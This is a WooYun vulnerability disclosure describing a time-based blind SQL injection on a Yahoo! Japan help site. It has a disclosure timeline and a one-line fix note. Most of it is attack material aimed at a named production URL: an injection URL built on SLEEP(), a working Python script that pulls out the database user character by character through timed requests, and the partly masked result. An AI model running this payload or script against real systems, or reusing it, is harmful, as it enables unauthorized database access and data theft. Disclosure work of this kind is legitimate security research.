wybug_title: Yahoo! Japan Website Time-based Blind SQL Injection Vulnerabilities
wybug_status: 已交由第三方合作机构(日本国家互联网应急中心(JPCERT/CC))处理
wybug_detail:
漏洞详情 披露状态：   									2016-02-16：	细节已通知厂商并且等待厂商处理中									2016-02-22：	厂商已经主动忽略漏洞，细节向公众公开  简要描述： Yahoo! Japan Website Time-based Blind SQL Injection Vulnerabilities 详细说明：  #1 DESCRIPTIONVulnerable website: https://help.marketing.yahoo.co.jp#2 VULNERABILITY5 seconds after the web page is successfully opened
https://help.marketing.yahoo.co.jp/ja/?cat=5) AND (SELECT * FROM (SELECT(SLEEP(5)))ring) AND (1=1&s=123
   漏洞证明：  #3 EXPLOIT
#!/usr/bin/env python# encoding: utf-8# yahoo.jp.py # ringzero@**.**.**.**import requestsimport timeimport sysreload(sys)sys.setdefaultencoding('utf-8')payloads = list('abcdefghijklmnopqrstuvwxyz0123456789@_.')for i in range(1,50):    for _str in payloads:        start_time = time.time()        url = "https://help.marketing.yahoo.co.jp/ja/?cat=5) AND (SELECT * FROM (SELECT(SLEEP((ASCII(MID(LOWER(USER())," + str(i) + ",1))=" + str(ord(_str)) + ")*5)))ring) AND (2140=2140&s=123"        result = requests.get(url).text        if(time.time() - start_time) > 4:            print _str            break
#4 Proof of Conceptdatabase user():
wordpresj@**.**.**.**
   修复方案：  # before making any kind of request with them must be validated.   版权声明：转载请注明来源 猪猪侠@乌云
